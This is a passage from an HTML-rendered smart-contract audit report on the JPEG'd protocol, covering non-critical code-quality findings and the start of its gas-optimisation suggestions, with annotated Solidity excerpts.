class=\"mtk1\">:        </span><span class=\"mtk12\">newAccRewardsPerShare</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">179</span><span class=\"mtk1\">:            (</span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">userLastAccRewardPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">])) / </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>I suggest using <code>constant</code> variables as this would make the code more maintainable and readable while costing nothing gas-wise.</p>\n<h2 id=\"n-01-avoid-floating-pragmas-the-version-should-be-locked-preferably-at--084\" style=\"position:relative;\"><a href=\"#n-01-avoid-floating-pragmas-the-version-should-be-locked-preferably-at--084\" aria-label=\"n 01 avoid floating pragmas the version should be locked preferably at  084 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Avoid floating pragmas: the version should be locked (preferably at >= <code>0.8.4</code>)</h2>\n<p>The pragma declared across the solution is <code>^0.8.0</code>. As the compiler introduces a several interesting upgrades in Solidity <code>0.8.4</code>, consider locking at this version or a more recent one.</p>\n<h2 id=\"n-02-related-data-should-be-grouped-in-a-struct\" style=\"position:relative;\"><a href=\"#n-02-related-data-should-be-grouped-in-a-struct\" aria-label=\"n 02 related data should be grouped in a struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Related data should be grouped in a struct</h2>\n<p>The following <code>maps</code> should be grouped in structs.</p>\n<p>From:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">31</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit NC: related data 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">32</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userLastAccRewardPerShare</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit NC: related data 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">33</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userPendingRewards</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit NC: related data 3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">20</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit NC: related data 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IStrategy</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit NC: related data 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">22</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IStrategy</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">approvedStrategies</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit NC: related data 3</span></span></span></code></pre>\n<p>To</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">UserInfo</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastAccRewardPerShare</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingReward</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">UserInfo</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userInfo</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>And</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenInfo</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IStrategy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">approvedStrategies</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IStrategy</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">pendingReward</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenInfo</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenInfo</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>It would be less error-prone, more readable, and it would be possible to delete all related fields with a simple <code>delete userInfo[address]</code>.</p>\n<p>However, the sponsor should notice that <code>pendingReward</code> won’t be as easily deleted in <code>tokenInfo</code>, as it’s a <code>mapping</code> field. It would still improve code quality nonetheless.</p>\n<h2 id=\"n-03-unused-named-returns\" style=\"position:relative;\"><a href=\"#n-03-unused-named-returns\" aria-label=\"n 03 unused named returns permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Unused named returns</h2>\n<p>Using both named returns and a return statement isn’t necessary. Removing one of those can improve code clarity (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">NFTEscrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">081</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">precompute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_idx</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">082:         </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">083:         </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">084:         </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\">) </span><span class=\"mtk3\">//@audit NC: unused named returns</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">085:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">091</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">salt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">sha256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint160</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit NC: unused named returns</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/225\">spaghettieth (JPEG’d) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/225#issuecomment-1115281813\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I agree with the warden’s security ratings for the issues described.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 38 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/121\">report highlighted below</a> by <strong>Dravee</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/207\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/216\">rfa</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/195\">0xkatana</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/45\">TerrierLover</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/152\">saian</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/187\">Tomio</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/127\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/149\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/70\">robee</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/143\">Foundation</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/169\">WatchPug</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/110\">catchup</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/32\">0v3rf10w</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/111\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/185\">ellahi</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/102\">securerodd</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/91\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/153\">Cityscape</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/170\">FSchmoede</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/63\">hickuphh3</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/210\">ilan</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/223\">kenta</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/100\">slywaters</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/51\">rokinot</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/218\">0xDjango</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/142\">JMukesh</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/226\">nahnah</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/85\">PPrieditis</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/174\">sorrynotsorry</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/180\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/191\">Hawkeye</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/25\">Meta0xNull</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/43\">dirk_y</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/141\">rayn</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/35\">Cr4ckM3</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/151\">Picodes</a>, and <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/190\">kebabsec</a>.</em></p>\n<h2 id=\"table-of-contents\" style=\"position:relative;\"><a href=\"#table-of-contents\" aria-label=\"table of contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Table of Contents</h2>\n<p>See <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/121\">original submission</a>.</p>\n<h2 id=\"g-01-nftescrow_executetransfer-cheap-contract-deployment-through-clones\" style=\"position:relative;\"><a href=\"#g-01-nftescrow_executetransfer-cheap-contract-deployment-through-clones\" aria-label=\"g 01 nftescrow_executetransfer cheap contract deployment through clones permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] <code>NFTEscrow._executeTransfer()</code>: Cheap Contract Deployment Through Clones</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_executeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_idx</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:         (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">precompute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_idx</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:         </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">FlashEscrow</span><span class=\"mtk1\">{</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">: </span><span class=\"mtk10\">salt</span><span class=\"mtk1\">}( </span><span class=\"mtk3\">//@audit gas: deployment can cost less through clones </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_encodeFlashEscrowPayload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_idx</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>There’s a way to save a significant amount of gas on deployment using Clones: <a href=\"https://www.youtube.com/watch?v=3Mw-pMmJ7TA\">https://www.youtube.com/watch?v=3Mw-pMmJ7TA</a> .</p>\n<p>This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:</p>\n<ul>\n<li><a href=\"https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516\">https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516</a></li>\n<li><a href=\"https://github.com/porter-finance/v1-core/pull/34\">https://github.com/porter-finance/v1-core/pull/34</a></li>\n</ul>\n<p>I suggest applying a similar pattern.</p>\n<h2 id=\"g-02-lpfarmingnewepoch-l128-and-l133-should-be-unchecked-due-to-parent-ifelse-condition\" style=\"position:relative;\"><a href=\"#g-02-lpfarmingnewepoch-l128-and-l133-should-be-unchecked-due-to-parent-ifelse-condition\" aria-label=\"g 02 lpfarmingnewepoch l128 and l133 should be unchecked due to parent ifelse condition permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] <code>LPFarming.newEpoch()</code>: L128 and L133 should be unchecked due to parent if/else condition</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an <code>unchecked</code> block: <a href=\"https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic\">https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic</a></p>\n<p>I suggest wrapping with an <code>unchecked</code> block here (see <code>@audit</code> tag):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">newEpoch</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">111:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">remainingRewards</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span 